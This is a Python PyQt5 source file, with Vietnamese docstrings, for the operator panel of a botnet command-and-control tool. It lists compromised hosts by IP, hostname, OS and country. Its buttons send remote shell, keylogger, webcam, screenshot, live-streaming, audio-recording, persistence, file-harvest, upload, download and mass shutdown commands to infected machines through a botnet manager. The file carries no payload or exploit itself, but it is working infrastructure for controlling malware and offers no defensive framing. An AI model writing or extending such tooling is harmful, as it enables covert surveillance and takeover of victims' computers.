#!/usr/bin/env python3
"""
Bot Management Widget Component - Real Data Integration + Advanced Features
"""

from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
import time
import random
from .advanced_features_control import AdvancedFeaturesWidget


class BotManagementWidget(QWidget):
    """Widget quản lý bot với dữ liệu thật và advanced features"""
    
    def __init__(self, botnet_manager=None):
        super().__init__()
        self.botnet_manager = botnet_manager
        self.selected_bots = []
        self.selected_bot_id = None
        
        self.init_ui()
        self.init_timers()
        
    def init_ui(self):
        """Khởi tạo giao diện bot management"""
        layout = QVBoxLayout()
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)
        
        # Title
        title = QLabel("🤖 Bot Management & Advanced Features")
        title.setStyleSheet("""
            QLabel {
                font-size: 28px;
                font-weight: bold;
                color: #2c3e50;
                margin-bottom: 10px;
            }
        """)
        layout.addWidget(title)
        
        # Stats row
        stats_layout = QHBoxLayout()
        
        # Total bots
        self.total_bots_card = self.create_stat_card("Total Bots", "0", "#3498db")
        stats_layout.addWidget(self.total_bots_card)
        
        # Online bots
        self.online_bots_card = self.create_stat_card("Online", "0", "#27ae60")
        stats_layout.addWidget(self.online_bots_card)
        
        # Offline bots
        self.offline_bots_card = self.create_stat_card("Offline", "0", "#e74c3c")
        stats_layout.addWidget(self.offline_bots_card)
        
        # Active tasks
        self.tasks_card = self.create_stat_card("Active Tasks", "0", "#f39c12")
        stats_layout.addWidget(self.tasks_card)
        
        # Advanced features active
        self.advanced_card = self.create_stat_card("Advanced Active", "0", "#9b59b6")
        stats_layout.addWidget(self.advanced_card)
        
        layout.addLayout(stats_layout)
        
        # Toolbar
        toolbar_layout = QHBoxLayout()
        
        refresh_btn = QPushButton("🔄 Refresh")
        refresh_btn.setStyleSheet(self.get_button_style("#3498db"))
        refresh_btn.clicked.connect(self.refresh_bots)
        
        select_all_btn = QPushButton("☑️ Select All")
        select_all_btn.setStyleSheet(self.get_button_style("#2ecc71"))
        select_all_btn.clicked.connect(self.select_all_bots)
        
        disconnect_btn = QPushButton("❌ Disconnect Selected")
        disconnect_btn.setStyleSheet(self.get_button_style("#e74c3c"))
        disconnect_btn.clicked.connect(self.disconnect_selected)
        
        commands_btn = QPushButton("💻 Mass Commands")
        commands_btn.setStyleSheet(self.get_button_style("#9b59b6"))
        commands_btn.clicked.connect(self.show_mass_commands)
        
        # Advanced features toggle
        self.toggle_advanced_btn = QPushButton("🚀 Show Advanced")
        self.toggle_advanced_btn.setStyleSheet(self.get_button_style("#8e44ad"))
        self.toggle_advanced_btn.clicked.connect(self.toggle_advanced_features)
        
        toolbar_layout.addWidget(refresh_btn)
        toolbar_layout.addWidget(select_all_btn)
        toolbar_layout.addWidget(disconnect_btn)
        toolbar_layout.addWidget(commands_btn)
        toolbar_layout.addWidget(self.toggle_advanced_btn)
        toolbar_layout.addStretch()
        
        layout.addLayout(toolbar_layout)
        
        # Main content area - now with 3 panels
        main_splitter = QSplitter(Qt.Horizontal)
        
        # Left: Bot table
        self.create_bot_table()
        main_splitter.addWidget(self.bot_table_widget)
        
        # Center: Bot details and basic control panel
        self.create_control_panel()
        main_splitter.addWidget(self.control_panel)
        
        # Right: Advanced features panel (initially hidden)
        self.create_advanced_panel()
        main_splitter.addWidget(self.advanced_panel)
        self.advanced_panel.setVisible(False)
        
        # Set initial sizes
        main_splitter.setSizes([500, 300, 400])
        layout.addWidget(main_splitter)
        
        self.setLayout(layout)
        
        # Load real data
        self.load_real_bot_data()
        
    def create_advanced_panel(self):
        """Tạo panel advanced features"""
        self.advanced_panel = QWidget()
        layout = QVBoxLayout()
        
        # Advanced features widget
        self.advanced_features = AdvancedFeaturesWidget()
        
        # Connect signals
        self.advanced_features.command_sent.connect(self.handle_advanced_command)
        
        layout.addWidget(self.advanced_features)
        self.advanced_panel.setLayout(layout)
        
    def toggle_advanced_features(self):
        """Toggle advanced features panel"""
        if self.advanced_panel.isVisible():
            self.advanced_panel.setVisible(False)
            self.toggle_advanced_btn.setText("🚀 Show Advanced")
        else:
            self.advanced_panel.setVisible(True)
            self.toggle_advanced_btn.setText("🔒 Hide Advanced")
            # Set selected bot in advanced features
            if self.selected_bot_id:
                self.advanced_features.set_selected_bot(self.selected_bot_id)
        
    def create_stat_card(self, title, value, color):
        """Tạo stat card"""
        card = QWidget()
        card.setFixedHeight(80)
        card.setStyleSheet(f"""
            QWidget {{
                background: white;
                border: 2px solid {color};
                border-radius: 8px;
                margin: 2px;
            }}
        """)
        
        layout = QVBoxLayout()
        layout.setContentsMargins(15, 10, 15, 10)
        
        # Title
        title_label = QLabel(title)
        title_label.setStyleSheet("""
            QLabel {
                font-size: 12px;
                font-weight: bold;
                color: #7f8c8d;
            }
        """)
        
        # Value
        value_label = QLabel(value)
        value_label.setStyleSheet(f"""
            QLabel {{
                font-size: 24px;
                font-weight: bold;
                color: {color};
            }}
        """)
        value_label.setAlignment(Qt.AlignCenter)
        
        layout.addWidget(title_label)
        layout.addWidget(value_label)
        
        card.setLayout(layout)
        card.value_label = value_label
        
        return card
        
    def create_bot_table(self):
        """Tạo bảng danh sách bot"""
        self.bot_table_widget = QWidget()
        layout = QVBoxLayout()
        
        # Table
        self.bot_table = QTableWidget()
        self.bot_table.setColumnCount(9)
        self.bot_table.setHorizontalHeaderLabels([
            "ID", "IP Address", "Hostname", "OS", "Country", "Status", "Last Seen", "Tasks", "Advanced"
        ])
        
        # Style table
        self.bot_table.setStyleSheet("""
            QTableWidget {
                gridline-color: #bdc3c7;
                background-color: white;
                alternate-background-color: #ecf0f1;
                selection-background-color: #3498db;
                selection-color: white;
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                color: #2c3e50;
            }
            QTableWidget::item {
                padding: 8px;
                font-size: 12px;
                color: #2c3e50;
            }
            QHeaderView::section {
                background-color: #34495e;
                color: white;
                padding: 8px;
                border: none;
                font-weight: bold;
            }
        """)
        
        self.bot_table.setAlternatingRowColors(True)
        self.bot_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.bot_table.setSelectionMode(QAbstractItemView.MultiSelection)
        self.bot_table.horizontalHeader().setStretchLastSection(True)
        self.bot_table.setSortingEnabled(True)
        
        # Connect selection change
        self.bot_table.itemSelectionChanged.connect(self.on_bot_selected)
        
        layout.addWidget(self.bot_table)
        self.bot_table_widget.setLayout(layout)
        
    def create_control_panel(self):
        """Tạo panel điều khiển bot"""
        self.control_panel = QWidget()
        layout = QVBoxLayout()
        
        # Bot details section
        details_group = QGroupBox("📋 Bot Details")
        details_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #3498db;
                border-radius: 10px;
                margin-top: 10px;
                padding-top: 10px;
                color: #2c3e50;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #3498db;
            }
        """)
        
        details_layout = QVBoxLayout()
        
        self.details_text = QTextEdit()
        self.details_text.setStyleSheet("""
            QTextEdit {
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                padding: 10px;
                font-family: 'Consolas', monospace;
                font-size: 11px;
                background: #f8f9fa;
                color: #2c3e50;
            }
        """)
        self.details_text.setMaximumHeight(150)
        self.details_text.setPlainText("Select a bot to view details...")
        
        details_layout.addWidget(self.details_text)
        details_group.setLayout(details_layout)
        layout.addWidget(details_group)
        
        # Basic control buttons section
        control_group = QGroupBox("🎮 Basic Bot Control")
        control_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #2ecc71;
                border-radius: 10px;
                margin-top: 10px;
                padding-top: 10px;
                color: #2c3e50;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #2ecc71;
            }
        """)
        
        control_layout = QVBoxLayout()
        
        # Command buttons
        btn_layout1 = QHBoxLayout()
        
        shell_btn = QPushButton("💻 Shell")
        shell_btn.setStyleSheet(self.get_button_style("#34495e"))
        shell_btn.clicked.connect(self.open_shell)
        
        screenshot_btn = QPushButton("📷 Screenshot")
        screenshot_btn.setStyleSheet(self.get_button_style("#9b59b6"))
        screenshot_btn.clicked.connect(self.take_screenshot)
        
        btn_layout1.addWidget(shell_btn)
        btn_layout1.addWidget(screenshot_btn)
        
        btn_layout2 = QHBoxLayout()
        
        keylog_btn = QPushButton("⌨️ Keylogger")
        keylog_btn.setStyleSheet(self.get_button_style("#e67e22"))
        keylog_btn.clicked.connect(self.toggle_keylogger)
        
        webcam_btn = QPushButton("📹 Webcam")
        webcam_btn.setStyleSheet(self.get_button_style("#e74c3c"))
        webcam_btn.clicked.connect(self.access_webcam)
        
        btn_layout2.addWidget(keylog_btn)
        btn_layout2.addWidget(webcam_btn)
        
        btn_layout3 = QHBoxLayout()
        
        sysinfo_btn = QPushButton("ℹ️ System Info")
        sysinfo_btn.setStyleSheet(self.get_button_style("#3498db"))
        sysinfo_btn.clicked.connect(self.get_system_info)
        
        persist_btn = QPushButton("🔒 Persistence")
        persist_btn.setStyleSheet(self.get_button_style("#f39c12"))
        persist_btn.clicked.connect(self.manage_persistence)
        
        btn_layout3.addWidget(sysinfo_btn)
        btn_layout3.addWidget(persist_btn)
        
        control_layout.addLayout(btn_layout1)
        control_layout.addLayout(btn_layout2)
        control_layout.addLayout(btn_layout3)
        
        # File operations
        file_group = QGroupBox("📁 File Operations")
        file_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #f39c12;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 10px;
                color: #2c3e50;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #f39c12;
            }
        """)
        
        file_layout = QHBoxLayout()
        
        upload_btn = QPushButton("📤 Upload")
        upload_btn.setStyleSheet(self.get_button_style("#2ecc71"))
        upload_btn.clicked.connect(self.upload_file)
        
        download_btn = QPushButton("📥 Download")
        download_btn.setStyleSheet(self.get_button_style("#3498db"))
        download_btn.clicked.connect(self.download_file)
        
        file_layout.addWidget(upload_btn)
        file_layout.addWidget(download_btn)
        
        file_group.setLayout(file_layout)
        control_layout.addWidget(file_group)
        
        control_group.setLayout(control_layout)
        layout.addWidget(control_group)
        
        # Advanced features quick access
        quick_advanced_group = QGroupBox("🚀 Quick Advanced Features")
        quick_advanced_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #8e44ad;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 10px;
                color: #2c3e50;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #8e44ad;
            }
        """)
        
        quick_layout = QHBoxLayout()
        
        quick_stream_btn = QPushButton("🎥 Stream")
        quick_stream_btn.setStyleSheet(self.get_button_style("#e74c3c"))
        quick_stream_btn.clicked.connect(self.quick_start_streaming)
        
        quick_audio_btn = QPushButton("🎤 Audio")
        quick_audio_btn.setStyleSheet(self.get_button_style("#9b59b6"))
        quick_audio_btn.clicked.connect(self.quick_record_audio)
        
        quick_harvest_btn = QPushButton("📁 Harvest")
        quick_harvest_btn.setStyleSheet(self.get_button_style("#f39c12"))
        quick_harvest_btn.clicked.connect(self.quick_harvest_files)
        
        quick_layout.addWidget(quick_stream_btn)
        quick_layout.addWidget(quick_audio_btn)
        quick_layout.addWidget(quick_harvest_btn)
        
        quick_advanced_group.setLayout(quick_layout)
        control_layout.addWidget(quick_advanced_group)
        
        layout.addStretch()
        self.control_panel.setLayout(layout)
        
    def get_button_style(self, color):
        """Lấy style cho button"""
        return f"""
            QPushButton {{
                background: {color};
                color: white;
                border: none;
                padding: 10px 15px;
                border-radius: 8px;
                font-weight: bold;
                font-size: 12px;
                margin: 2px;
            }}
            QPushButton:hover {{
                background: {self.darken_color(color)};
            }}
            QPushButton:pressed {{
                background: {self.darken_color(color, 0.8)};
            }}
        """
        
    def darken_color(self, hex_color, factor=0.9):
        """Làm tối màu"""
        hex_color = hex_color.lstrip('#')
        rgb = tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
        rgb = tuple(int(c * factor) for c in rgb)
        return f"#{rgb[0]:02x}{rgb[1]:02x}{rgb[2]:02x}"
        
    def load_real_bot_data(self):
        """Load dữ liệu bot thật từ botnet manager"""
        try:
            if self.botnet_manager and hasattr(self.botnet_manager, 'get_bots'):
                # Get real bots from manager
                bots = self.botnet_manager.get_bots()
                
                if bots:
                    self.bot_table.setRowCount(len(bots))
                    
                    for row, bot in enumerate(bots):
                        # Extract real bot data
                        bot_id = bot.get('id', f'BOT{row+1:03d}')
                        ip_address = bot.get('ip_address', 'Unknown')
                        hostname = bot.get('hostname', 'Unknown')
                        os_info = bot.get('os', 'Unknown')
                        country = bot.get('country', '🏳️ Unknown')
                        status = bot.get('status', 'Unknown')
                        last_seen = bot.get('last_seen', 'Never')
                        tasks = bot.get('active_tasks', 0)
                        advanced_active = bot.get('advanced_features', 0)
                        
                        # Add to table
                        items = [bot_id, ip_address, hostname, os_info, country, status, last_seen, str(tasks), str(advanced_active)]
                        
                        for col, data in enumerate(items):
                            item = QTableWidgetItem(str(data))
                            
                            # Color code status
                            if col == 5:  # Status column
                                if "Online" in status or "Connected" in status:
                                    item.setForeground(QColor("#27ae60"))
                                elif "Idle" in status:
                                    item.setForeground(QColor("#f39c12"))
                                elif "Offline" in status or "Disconnected" in status:
                                    item.setForeground(QColor("#e74c3c"))
                            elif col == 8:  # Advanced features column
                                if int(data) > 0:
                                    item.setForeground(QColor("#8e44ad"))
                                else:
                                    item.setForeground(QColor("#bdc3c7"))
                            else:
                                item.setForeground(QColor("#2c3e50"))
                                    
                            self.bot_table.setItem(row, col, item)
                else:
                    # No real bots, show empty state
                    self.bot_table.setRowCount(0)
                    
            else:
                # Fallback: try to get from server directly
                if hasattr(self, 'get_server_bots'):
                    self.get_server_bots()
                else:
                    # No data available
                    self.bot_table.setRowCount(0)
                    
        except Exception as e:
            print(f"Error loading real bot data: {e}")
            # Show empty state on error
            self.bot_table.setRowCount(0)
            
        # Update stats
        self.update_bot_stats()
        
        # Resize columns
        self.bot_table.resizeColumnsToContents()
        
    def get_server_bots(self):
        """Get bots directly from server"""
        try:
            # Try to access server instance from parent
            main_window = self.get_main_window()
            if main_window and main_window.server:
                server = main_window.server
                
                if hasattr(server, 'connected_clients'):
                    clients = server.connected_clients
                    
                    self.bot_table.setRowCount(len(clients))
                    
                    for row, (client_id, client_info) in enumerate(clients.items()):
                        # Extract client data
                        bot_id = client_id
                        ip_address = client_info.get('ip', 'Unknown')
                        hostname = client_info.get('hostname', 'Unknown')
                        os_info = client_info.get('os', 'Unknown')
                        country = client_info.get('country', '🏳️ Unknown')
                        status = "🟢 Online" if client_info.get('connected', False) else "🔴 Offline"
                        last_seen = client_info.get('last_seen', 'Unknown')
                        tasks = client_info.get('tasks', 0)
                        advanced_active = client_info.get('advanced_features', 0)
                        
                        items = [bot_id, ip_address, hostname, os_info, country, status, last_seen, str(tasks), str(advanced_active)]
                        
                        for col, data in enumerate(items):
                            item = QTableWidgetItem(str(data))
                            
                            if col == 5:  # Status column
                                if "Online" in data:
                                    item.setForeground(QColor("#27ae60"))
                                else:
                                    item.setForeground(QColor("#e74c3c"))
                            elif col == 8:  # Advanced features column
                                if int(data) > 0:
                                    item.setForeground(QColor("#8e44ad"))
                                else:
                                    item.setForeground(QColor("#bdc3c7"))
                            else:
                                item.setForeground(QColor("#2c3e50"))
                                    
                            self.bot_table.setItem(row, col, item)
                            
        except Exception as e:
            print(f"Error getting server bots: {e}")
            
    def get_main_window(self):
        """Get reference to main window"""
        widget = self
        while widget.parent():
            widget = widget.parent()
            if hasattr(widget, 'server'):
                return widget
        return None
        
    def update_bot_stats(self):
        """Cập nhật bot statistics"""
        try:
            total_bots = self.bot_table.rowCount()
            online_bots = 0
            offline_bots = 0
            total_tasks = 0
            advanced_active = 0
            
            for row in range(total_bots):
                try:
                    status_item = self.bot_table.item(row, 5)
                    tasks_item = self.bot_table.item(row, 7)
                    advanced_item = self.bot_table.item(row, 8)
                    
                    if status_item:
                        status = status_item.text()
                        if "Online" in status or "Connected" in status:
                            online_bots += 1
                        elif "Offline" in status or "Disconnected" in status:
                            offline_bots += 1
                            
                    if tasks_item:
                        total_tasks += int(tasks_item.text() or 0)
                        
                    if advanced_item:
                        advanced_active += int(advanced_item.text() or 0)
                        
                except:
                    pass
                    
            # Update cards
            self.total_bots_card.value_label.setText(str(total_bots))
            self.online_bots_card.value_label.setText(str(online_bots))
            self.offline_bots_card.value_label.setText(str(offline_bots))
            self.tasks_card.value_label.setText(str(total_tasks))
            self.advanced_card.value_label.setText(str(advanced_active))
            
        except Exception as e:
            print(f"Error updating bot stats: {e}")
        
    def init_timers(self):
        """Khởi tạo timers"""
        # Auto refresh timer
        self.refresh_timer = QTimer()
        self.refresh_timer.timeout.connect(self.auto_refresh_bots)
        self.refresh_timer.start(30000)  # 30 seconds
        
    def auto_refresh_bots(self):
        """Tự động refresh bot data"""
        try:
            self.load_real_bot_data()
        except Exception as e:
            print(f"Error in auto refresh: {e}")
            
    def on_bot_selected(self):
        """Xử lý khi bot được chọn"""
        selected_rows = set()
        for item in self.bot_table.selectedItems():
            selected_rows.add(item.row())
            
        if selected_rows:
            row = list(selected_rows)[0]
            try:
                # Get bot details
                bot_id = self.bot_table.item(row, 0).text()
                ip_address = self.bot_table.item(row, 1).text()
                hostname = self.bot_table.item(row, 2).text()
                os_info = self.bot_table.item(row, 3).text()
                country = self.bot_table.item(row, 4).text()
                status = self.bot_table.item(row, 5).text()
                last_seen = self.bot_table.item(row, 6).text()
                tasks = self.bot_table.item(row, 7).text()
                advanced = self.bot_table.item(row, 8).text()
                
                # Update selected bot ID
                self.selected_bot_id = bot_id
                
                # Update details text
                details = f"""
Bot ID: {bot_id}
IP Address: {ip_address}
Hostname: {hostname}
Operating System: {os_info}
Country: {country}
Status: {status}
Last Seen: {last_seen}
Active Tasks: {tasks}
Advanced Features: {advanced}

Connection Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
                """.strip()
                
                self.details_text.setPlainText(details)
                
                # Update advanced features widget
                if hasattr(self, 'advanced_features'):
                    self.advanced_features.set_selected_bot(bot_id)
                    
                # Store selected bots
                self.selected_bots = [bot_id]
                
            except Exception as e:
                print(f"Error updating bot details: {e}")
                self.details_text.setPlainText("Error loading bot details")
        else:
            self.details_text.setPlainText("Select a bot to view details...")
            self.selected_bot_id = None
            self.selected_bots = []
            
    def refresh_bots(self):
        """Refresh danh sách bot"""
        try:
            self.load_real_bot_data()
            self.update_status_message("Bot list refreshed")
        except Exception as e:
            print(f"Error refreshing bots: {e}")
            
    def select_all_bots(self):
        """Select all bots"""
        self.bot_table.selectAll()
        
    def disconnect_selected(self):
        """Disconnect selected bots"""
        selected_rows = set()
        for item in self.bot_table.selectedItems():
            selected_rows.add(item.row())
            
        for row in selected_rows:
            try:
                bot_id = self.bot_table.item(row, 0).text()
                self.disconnect_bot(bot_id)
            except Exception as e:
                print(f"Error disconnecting bot: {e}")
                
    def disconnect_bot(self, bot_id):
        """Disconnect specific bot"""
        try:
            if self.botnet_manager and hasattr(self.botnet_manager, 'disconnect_bot'):
                self.botnet_manager.disconnect_bot(bot_id)
            else:
                print(f"Disconnecting bot: {bot_id}")
                # Send disconnect command to server
                self.send_bot_command(bot_id, "disconnect", {})
        except Exception as e:
            print(f"Error disconnecting bot {bot_id}: {e}")
            
    def show_mass_commands(self):
        """Show mass commands dialog"""
        dialog = MassCommandDialog(self)
        dialog.exec_()
        
    def open_shell(self):
        """Mở shell với bot"""
        if not self.selected_bot_id:
            QMessageBox.warning(self, "Warning", "Please select a bot first")
            return
            
        try:
            # Send shell command
            self.send_bot_command(self.selected_bot_id, "shell", {"action": "open"})
        except Exception as e:
            print(f"Error opening shell: {e}")
            
    def take_screenshot(self):
        """Chụp màn hình"""
        if not self.selected_bot_id:
            QMessageBox.warning(self, "Warning", "Please select a bot first")
            return
            
        try:
            # Send screenshot command
            self.send_bot_command(self.selected_bot_id, "screenshot", {"action": "capture"})
        except Exception as e:
            print(f"Error taking screenshot: {e}")
            
    def send_bot_command(self, bot_id, command, parameters):
        """Send command to specific bot"""
        try:
            if self.botnet_manager and hasattr(self.botnet_manager, 'send_command'):
                self.botnet_manager.send_command(bot_id, command, parameters)
            else:
                print(f"Sending command to {bot_id}: {command} with params: {parameters}")
                # Integration with server will be implemented here
        except Exception as e:
            print(f"Error sending command: {e}")
            
    def handle_advanced_command(self, bot_id, command, params):
        """Handle advanced feature commands"""
        try:
            print(f"Advanced command for {bot_id}: {command} with params: {params}")
            
            # This is where the integration with the advanced features manager would happen
            # For now, just log the command
            
            # In a real implementation, this would call the advanced features manager:
            # result = self.advanced_features_manager.execute_command(command, params)
            
            # Simulate response for demo
            if command.startswith('stream_'):
                response = {'type': 'screen_frame', 'frame_number': 1, 'success': True}
            elif command.startswith('audio_'):
                response = {'type': 'audio_recording', 'duration': 10, 'size': 44100, 'success': True}
            elif command.startswith('harvest_'):
                response = {'type': 'file_harvest', 'files_count': 25, 'total_size': 1024000, 'success': True}
            else:
                response = {'type': 'command_result', 'success': True, 'message': 'Command executed'}
                
            # Send response back to advanced features widget
            if hasattr(self, 'advanced_features'):
                self.advanced_features.handle_command_response(response)
                
        except Exception as e:
            print(f"Error handling advanced command: {e}")
            
    # Quick access methods
    def quick_start_streaming(self):
        """Quick start streaming"""
        if not self.selected_bot_id:
            QMessageBox.warning(self, "Warning", "Please select a bot first")
            return
            
        # Show advanced panel and switch to streaming tab
        if not self.advanced_panel.isVisible():
            self.toggle_advanced_features()
        self.advanced_features.tab_widget.setCurrentIndex(0)  # Streaming tab
        
    def quick_record_audio(self):
        """Quick record audio"""
        if not self.selected_bot_id:
            QMessageBox.warning(self, "Warning", "Please select a bot first")
            return
            
        # Show advanced panel and switch to audio tab
        if not self.advanced_panel.isVisible():
            self.toggle_advanced_features()
        self.advanced_features.tab_widget.setCurrentIndex(1)  # Audio tab
        
    def quick_harvest_files(self):
        """Quick harvest files"""
        if not self.selected_bot_id:
            QMessageBox.warning(self, "Warning", "Please select a bot first")
            return
            
        # Show advanced panel and switch to harvest tab
        if not self.advanced_panel.isVisible():
            self.toggle_advanced_features()
        self.advanced_features.tab_widget.setCurrentIndex(2)  # Harvest tab
        
    def toggle_keylogger(self):
        """Toggle keylogger"""
        if not self.selected_bot_id:
            QMessageBox.warning(self, "Warning", "Please select a bot first")
            return
        self.send_bot_command(self.selected_bot_id, "keylogger", {"action": "toggle"})
        
    def access_webcam(self):
        """Access webcam"""
        if not self.selected_bot_id:
            QMessageBox.warning(self, "Warning", "Please select a bot first")
            return
        self.send_bot_command(self.selected_bot_id, "webcam", {"action": "access"})
        
    def get_system_info(self):
        """Get system information"""
        if not self.selected_bot_id:
            QMessageBox.warning(self, "Warning", "Please select a bot first")
            return
        self.send_bot_command(self.selected_bot_id, "sysinfo", {"action": "get"})
        
    def manage_persistence(self):
        """Manage persistence"""
        if not self.selected_bot_id:
            QMessageBox.warning(self, "Warning", "Please select a bot first")
            return
        self.send_bot_command(self.selected_bot_id, "persistence", {"action": "manage"})
        
    def upload_file(self):
        """Upload file to bot"""
        if not self.selected_bot_id:
            QMessageBox.warning(self, "Warning", "Please select a bot first")
            return
            
        file_path, _ = QFileDialog.getOpenFileName(self, "Select file to upload")
        if file_path:
            self.send_bot_command(self.selected_bot_id, "upload", {"file_path": file_path})
            
    def download_file(self):
        """Download file from bot"""
        if not self.selected_bot_id:
            QMessageBox.warning(self, "Warning", "Please select a bot first")
            return
            
        remote_path, ok = QInputDialog.getText(self, "Download File", "Enter remote file path:")
        if ok and remote_path:
            self.send_bot_command(self.selected_bot_id, "download", {"remote_path": remote_path})
            
    def update_data(self):
        """Update data (called from main window)"""
        try:
            self.load_real_bot_data()
        except Exception as e:
            print(f"Error updating data: {e}")
            
    def update_status_message(self, message):
        """Update status message"""
        if hasattr(self, 'advanced_features'):
            self.advanced_features.update_status(message)


class MassCommandDialog(QDialog):
    """Dialog cho mass commands"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Mass Commands")
        self.setFixedSize(400, 300)
        
        layout = QVBoxLayout()
        
        # Command selection
        layout.addWidget(QLabel("Select Command:"))
        
        self.command_combo = QComboBox()
        self.command_combo.addItems([
            "screenshot", "sysinfo", "keylogger_start", "keylogger_stop",
            "webcam_capture", "disconnect", "restart", "shutdown"
        ])
        layout.addWidget(self.command_combo)
        
        # Parameters
        layout.addWidget(QLabel("Parameters (JSON):"))
        self.params_text = QTextEdit()
        self.params_text.setPlainText("{}")
        layout.addWidget(self.params_text)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        execute_btn = QPushButton("Execute")
        execute_btn.clicked.connect(self.execute_command)
        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(self.reject)
        
        button_layout.addWidget(execute_btn)
        button_layout.addWidget(cancel_btn)
        
        layout.addLayout(button_layout)
        self.setLayout(layout)
        
    def execute_command(self):
        """Execute mass command"""
        command = self.command_combo.currentText()
        try:
            import json
            params = json.loads(self.params_text.toPlainText())
            
            # Here you would execute the command on all selected bots
            print(f"Executing mass command: {command} with params: {params}")
            
            self.accept()
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Invalid parameters: {str(e)}")